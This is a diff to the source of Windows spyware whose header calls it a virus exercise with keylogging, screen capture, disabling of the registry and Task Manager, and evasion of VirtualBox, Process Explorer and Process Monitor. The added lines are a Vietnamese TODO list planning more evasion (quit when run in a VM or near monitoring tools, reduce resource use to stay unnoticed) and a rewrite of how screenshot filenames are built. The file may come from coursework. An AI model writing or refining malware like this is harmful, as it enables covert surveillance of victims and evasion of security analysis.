@@ -1,4 +1,4 @@
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+﻿//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 //
 // Description: File virus bai 1
 // Author: SonTDc
@@ -6,6 +6,17 @@
 // Additional information: File virus bao gom cac hanh vi: Keylogger, Screen Capture, Disable registry and task manager
 // anti VirtualBox and Process explorer, process monitor
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+// TODO: Sửa lại một số vấn đề:
+// Nếu ở trong virtualbox thì ko hiển thị mà kết thúc luôn tiến trình
+// Nếu tồn tại procmon hay procexp thì kết thúc luôn tiến trình
+// Nếu tồn tại taskmanager thì kết thúc tiến trình
+// Chạy test trên các phiên bản windows khác nhau
+// Cố gắng giảm thiểu cpu và ram xuống mức thấp nhất có thể
+
+#define JUSTSPY
+
+
 
 #include "stdafx.h"
 #include "SpywareVirus.h"
@@ -196,30 +207,7 @@ void SetNameOfFileCapture()
 {
 	SYSTEMTIME systime;
 	GetSystemTime(&systime);
-	lstrcpy(g_lpCaptureFile, g_lpFolderVirus);
-	lstrcat(g_lpCaptureFile, L"ScreenCapture");
-	TCHAR tTempName[MAX_LOADSTRING];
-	wsprintf(tTempName, L"%d", systime.wMilliseconds);
-	lstrcat(g_lpCaptureFile, tTempName);
-	lstrcat(g_lpCaptureFile, L"_");
-	wsprintf(tTempName, L"%d", systime.wSecond);
-	lstrcat(g_lpCaptureFile, tTempName);
-	lstrcat(g_lpCaptureFile, L"_");
-	wsprintf(tTempName, L"%d", systime.wMinute);
-	lstrcat(g_lpCaptureFile, tTempName);
-	lstrcat(g_lpCaptureFile, L"_");
-	wsprintf(tTempName, L"%d", systime.wHour);
-	lstrcat(g_lpCaptureFile, tTempName);
-	lstrcat(g_lpCaptureFile, L"_");
-	wsprintf(tTempName, L"%d", systime.wDay);
-	lstrcat(g_lpCaptureFile, tTempName);
-	lstrcat(g_lpCaptureFile, L"_");
-	wsprintf(tTempName, L"%d", systime.wMonth);
-	lstrcat(g_lpCaptureFile, tTempName);
-	lstrcat(g_lpCaptureFile, L"_");
-	wsprintf(tTempName, L"%d", systime.wYear);
-	lstrcat(g_lpCaptureFile, tTempName);
-	lstrcat(g_lpCaptureFile, L".bmp");
+	wsprintf(g_lpCaptureFile, L"%s_ScreenCapture_%d_%d_%d_%d_%d_%d_%d.bmp", g_lpFolderVirus, systime.wMilliseconds, systime.wSecond, systime.wMinute, systime.wHour, systime.wDay, systime.wMonth, systime.wYear);
 
 }
 
